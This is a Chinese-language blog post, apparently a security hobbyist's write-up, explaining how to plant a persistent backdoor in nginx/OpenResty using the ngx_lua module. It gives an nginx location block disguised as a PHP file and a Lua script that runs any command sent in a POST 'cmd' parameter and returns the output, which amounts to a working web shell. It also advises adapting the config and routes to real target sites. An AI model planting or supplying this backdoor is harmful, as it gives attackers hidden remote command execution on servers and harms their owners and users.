---
layout: post
title: Nginx Lua Backdoor  
tags: [lua文章]
categories: [topic]
---
<p>在先知看到了apache利用lua留后门，就想着用nginx也试试</p><p>安装有ngx_lua模块，在openresty和tengine中是默认安装了ngx_lua模块的。</p><p>我这里拿openresty举例，你可以在这里<a href="https://openresty.org/download/openresty-1.15.8.1-win64.zip">下载win平台</a>打包好的。</p><h1 id="步骤">步骤</h1><p>找到conf/nginx.conf，在server块中添加路由</p><div class="highlight"><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre class="chroma"><code class="language-nginx" data-lang="nginx"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td><td class="lntd"><pre class="chroma"><code class="language-nginx" data-lang="nginx"><span class="k">location</span> <span class="p">=</span> <span class="s">/a.php</span> <span class="p">{</span>  
    <span class="kn">default_type</span> <span class="s">&#39;text/plain&#39;</span><span class="p">;</span>  
    <span class="kn">content_by_lua_file</span> <span class="s">lua/backdoor.lua</span><span class="p">;</span>
<span class="p">}</span></code></pre></td></tr></tbody></table></div></div><p>然后创建<code>lua/backdoor.lua</code>脚本，你也可以创建在任意位置，不过要对应上文的<code>content_by_lua_file</code>字段</p><div class="highlight"><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre class="chroma"><code class="language-lua" data-lang="lua"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td><td class="lntd"><pre class="chroma"><code class="language-lua" data-lang="lua"><span class="n">ngx.req</span><span class="p">.</span><span class="n">read_body</span><span class="p">()</span>
<span class="kd">local</span> <span class="n">post_args</span> <span class="o">=</span> <span class="n">ngx.req</span><span class="p">.</span><span class="n">get_post_args</span><span class="p">()</span>
<span class="kd">local</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">post_args</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]</span>
<span class="kr">if</span> <span class="n">cmd</span> <span class="kr">then</span>
    <span class="n">f_ret</span> <span class="o">=</span> <span class="n">io.popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="kd">local</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">f_ret</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;*a&#34;</span><span class="p">)</span>
    <span class="n">ngx.say</span><span class="p">(</span><span class="n">string.format</span><span class="p">(</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span> <span class="n">ret</span><span class="p">))</span>
<span class="kr">end</span></code></pre></td></tr></tbody></table></div></div><p>重载nginx</p><div class="highlight"><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span></code></pre></td><td class="lntd"><pre class="chroma"><code class="language-bash" data-lang="bash">nginx -s reload</code></pre></td></tr></tbody></table></div></div><p>浏览器访问</p><p><img src="https://y4er.com/img/uploads/20190901174819.png" alt="20190901174819"/></p><h1 id="文后">文后</h1><p>在实际的环境中，conf文件并不固定，你需要针对不同站点的配置文件去修改。</p><p>而location你可以更灵活一些，毕竟他能用正则表达式�，具体怎么用看你自己咯。</p><p>参考链接</p><ol><li><a href="https://github.com/netxfly/nginx_lua_security">https://github.com/netxfly/nginx_lua_security</a></li><li><a href="https://xz.aliyun.com/t/6088">https://xz.aliyun.com/t/6088</a></li></ol><p><strong>文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。</strong></p>